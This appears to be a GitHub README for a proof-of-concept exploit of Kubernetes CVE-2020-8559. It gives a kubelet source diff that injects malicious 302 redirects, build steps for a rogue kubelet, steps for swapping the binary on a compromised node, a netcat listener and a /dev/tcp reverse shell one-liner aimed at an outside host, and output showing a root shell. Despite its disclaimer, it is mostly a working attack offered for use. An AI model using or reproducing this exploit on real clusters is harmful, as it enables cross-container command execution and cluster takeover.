# Kubernetes CVE-2020-8559 Proof of Concept PoC Exploit

__This is for demonstration purposes only. Only for use on systems you are authorized to preform administrative actions on and are authorized to exploit CVE-2020-8559 on__

This is a PoC for CVE-2020-8559 This vulnerability allows an attacker who has gotten `root` on a Node to execute commands on any other Container in the cluster allowing the attacker to take over the Kubernetes Master Node.

This vulnerability is due to the fact that the Kubernetes API Server and kubectl command will follow HTTP Redirects combined with the fact that the Kubernetes API just puts all of the components of an API request into the URL i.e. Node name, Pod name, Container name, and even the Command. Therefor, if the Kubelet process responds to `/exec`, `/attach`, `/portforward`, or any `resource: proxy` action with a HTTP 302 Redirect with a Location header which says to execute a different command on a different Node in a different Container the Kubernetes API Server or `kubectl` command will happily make a new request for whatever is in the Location header.

## Kubernetes Repo with my PoC Code

You can download my forked version of Kubernetes and switch to my branch to build the exploit `kubelet` binary.  
This branch is based on the `v1.15.9` tag.  

```
git clone -b CVE-2020-8559 --single-branch git@github.com:tdwyer/kubernetes.git
```

## Git diff

```
diff --git a/pkg/kubelet/server/server.go b/pkg/kubelet/server/server.go
index c1f1975fe43..8459802755e 100644
--- a/pkg/kubelet/server/server.go
+++ b/pkg/kubelet/server/server.go
@@ -867,6 +867,28 @@ func (s *Server) ServeHTTP(w http.ResponseWriter, req *http.Request) {

        method, path := req.Method, trimURLPath(req.URL.Path)

+       ////
+       ////
+       // If path is vulnerable to CVE-2020-8559 send 302 redirect with malicious Location header
+       ////
+       ////
+       protocol := "https"
+       // If attacking requests from admins using the kubectl command
+       //     host == hostname of the Kubernetes API server obtained from `kubectl -v 8 get pods`
+       // If attacing the Kubernetes API Server
+       //     host == hostname of the Node the Victim container is running on
+       host := "internal-api-123456-123456789.us-west-2.elb.amazonaws.com"
+       namespace := "kube-system"
+       pod := "kcd-7cfbb97c64-p4kf2"
+       container := "kcd"
+       command := "hostname"
+       if strings.Contains(req.URL.Path, "/exec") || strings.Contains(req.URL.Path, "/attach") || strings.Contains(req.URL.Path, "/portforward") {
+               fmt.Println("--------------------------------------------------------------")
+               fmt.Println("Sending Redirect")
+               fmt.Println("--------------------------------------------------------------")
+               http.Redirect(w, req, protocol+"://"+host+"/api/v1/namespaces/"+namespace+"/pods/"+pod+"/exec?command="+command+"&container="+container+"&stderr=true&stdout=true", 302)
+       }
+
        longRunning := strconv.FormatBool(isLongRunningRequest(path))

        servermetrics.HTTPRequests.WithLabelValues(method, path, serverType, longRunning).Inc()
```

## Configure

This PoC will just send 302 HTTP Redirect with a hard coded Location header, so you will need to edit `kubernetes/pkg/kubelet/server/server.go` and update `host`, `namespace`, `pod`, `container`, and `command`

__ProTip:__ List all of the Pods in the cluster. Then, configure this to execute commands on a Pod running on the Kubernetes Master Node in order start a reverse shell back to you in order to take over the cluster

## Build

After Configuring the attack, build a rogue `kubelet` binary

```
cd ~/go/src/k8s.io/kubernetes
GO111MODULE=on go mod download
cd ~/go/src/k8s.io/kubernetes/cmd/kubelet
go build
```

## Attack

1. Get root on a Node
2. Copy the rogue `kubelet` binary to the Node
3. Stop the `kubelet` process and over-write the binary with the rogue binary  
Find the PID of the `kubelet` process  
`ps aux |grep kubelet`  
Kill the `kubelet` process and copy the rogue binary into place  
`sudo kill $PID ; sudo cp kubelet /usr/local/bin/kubelet`  
4. Kill the `kubelet` process again so that it will re-start with the rogue binary  
Find the PID of the `kubelet` process  
`ps aux |grep kubelet`  
Kill the `kubelet` process  
`sudo kill $PID`  
5. If configured to attack an admin using the `kubectl` command on their local workstation, This command should return the hostname of the Victim Container instead of the container it should have been executed on
```
[0038][tdwyer@tdwyer-nuc:~/CVE-2020-8559]$ kubectl exec attacker-5cf89b94db-xdbfm -- date
kcd-7cfbb97c64-p4kf2
```


You can also start a reverse shell back you from any Container with
1. Start netcat listening on your workstation  
`nc -lv 4444`  
2. Use this command instead however you'll need to encode this. I'll update the exact way after I figure it out.  
`/bin/sh -i >& /dev/tcp/1.2.3.4/4444 0>&1`  

Success :D  
```
[1617][tdwyer@tdwyer-nuc:~]$ nc -lvk 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 9.8.7.6.in-addr.arpa 46828 received!
bash-5.0#
```

